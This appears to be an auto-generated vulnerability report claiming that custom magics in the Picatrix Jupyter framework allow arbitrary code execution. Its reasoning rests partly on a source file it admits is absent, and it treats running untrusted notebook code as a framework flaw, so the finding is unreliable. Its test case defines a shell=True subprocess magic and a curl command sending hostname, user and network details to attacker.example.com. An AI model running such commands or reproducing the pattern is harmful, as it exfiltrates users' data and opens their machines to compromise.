- Vulnerability Name: Arbitrary Code Execution via Malicious Custom Magics

- Description:
  1. A security analyst is tricked into opening and running a malicious Jupyter notebook.
  2. This notebook leverages Picatrix's functionality to register custom magics using the `@framework.picatrix_magic` decorator.
  3. The malicious notebook defines a custom magic that executes arbitrary Python code when invoked.
  4. When the security analyst unknowingly executes this malicious magic, arbitrary code is executed on their machine within the Jupyter notebook environment.

- Impact:
  - Critical: Arbitrary code execution on the security analyst's machine. This can lead to:
    - Data exfiltration: Sensitive data from the analyst's environment (including data being analyzed in the notebook) can be stolen.
    - System compromise: The attacker can gain full control of the analyst's machine, install malware, or perform other malicious actions.
    - Privilege escalation: If the analyst is running Jupyter with elevated privileges, the attacker can inherit those privileges.

- Vulnerability Rank: Critical

- Currently Implemented Mitigations:
  - None: The framework is designed to allow users to define and register custom magics easily. There are no built-in mechanisms to restrict or sanitize the code within these custom magics.

- Missing Mitigations:
  - Code review and validation: Implement a mechanism to review and validate custom magics before registration. This could involve static analysis, sandboxing, or manual review by a trusted authority.
  - Restriction of magic registration: Implement a configuration option to disable or restrict the registration of custom magics altogether, especially in environments where untrusted notebooks might be used.
  - User awareness and education: Educate users about the risks of running untrusted Jupyter notebooks and custom magics. Warn users about the potential for arbitrary code execution.

- Preconditions:
  - The security analyst must have Picatrix installed and initialized in their Jupyter environment.
  - The analyst must open and execute a malicious Jupyter notebook containing a custom magic definition.
  - The analyst must execute the malicious custom magic, either intentionally or unintentionally (e.g., through auto-execution features of Jupyter).

- Source Code Analysis:
  - File: `/code/picatrix/lib/framework.py` (Not present in provided files, but assumed based on `/code/docs/AddingAMagic.md` and `/code/end_to_end_tests/basic_test.py`)
  - The `@framework.picatrix_magic` decorator (as described in `/code/docs/AddingAMagic.md` and used in `/code/end_to_end_tests/basic_test.py`) is used to register Python functions as Picatrix magics.
  - When a function is decorated with `@framework.picatrix_magic`, it becomes available as a line magic (`%magic_name`), cell magic (`%%magic_name`), and a function (`magic_name_func()`).
  - The code within the decorated function is executed directly when the magic or function is invoked in a Jupyter notebook cell.
  - There is no input sanitization or validation performed on the code within the custom magic function by the Picatrix framework itself.
  - Visualization:

```
User opens malicious notebook -> Notebook registers malicious magic using @framework.picatrix_magic -> User executes malicious magic (%malicious_magic or %%malicious_magic or malicious_magic_func()) -> Arbitrary Python code in malicious magic is executed.
```

  - File: `/code/end_to_end_tests/basic_test.py`
  - The `test_magic_registration` function demonstrates how a custom magic can be registered and executed within the testing environment.
  - The `MAGIC_DEFINITION` constant shows an example of a custom magic definition using `@framework.picatrix_magic`. This example can be adapted to execute arbitrary code.

- Security Test Case:
  1. Create a malicious Jupyter notebook (e.g., `malicious_notebook.ipynb`).
  2. In the first cell of the notebook, add the following Python code to define and register a malicious custom magic:

```python
from picatrix.lib import framework
import subprocess

@framework.picatrix_magic
def malicious_magic(data):
  """This is a malicious magic that executes arbitrary code."""
  subprocess.run(data, shell=True) # Vulnerability: Using shell=True and unsanitized input 'data'
  return "Malicious command executed!"

print("Malicious magic registered: %malicious_magic")
```

  3. Save the notebook and share it with the target security analyst (e.g., via email, shared drive, or public repository).
  4. The security analyst opens the `malicious_notebook.ipynb` in their Jupyter environment with Picatrix initialized and executes the first cell. This registers the `%malicious_magic`.
  5. In a new cell, the attacker instructs the analyst to (or automatically executes if possible) run the malicious magic with a command to exfiltrate data or execute arbitrary commands, for example:

```
%malicious_magic curl -X POST -d "$(hostname && whoami && ip a)" https://attacker.example.com/data_receiver
```

  6. Observe that the command provided to `%malicious_magic` is executed on the analyst's machine. In this example, system information (hostname, username, IP address) is exfiltrated to `https://attacker.example.com/data_receiver`. The attacker can replace this with more harmful commands.
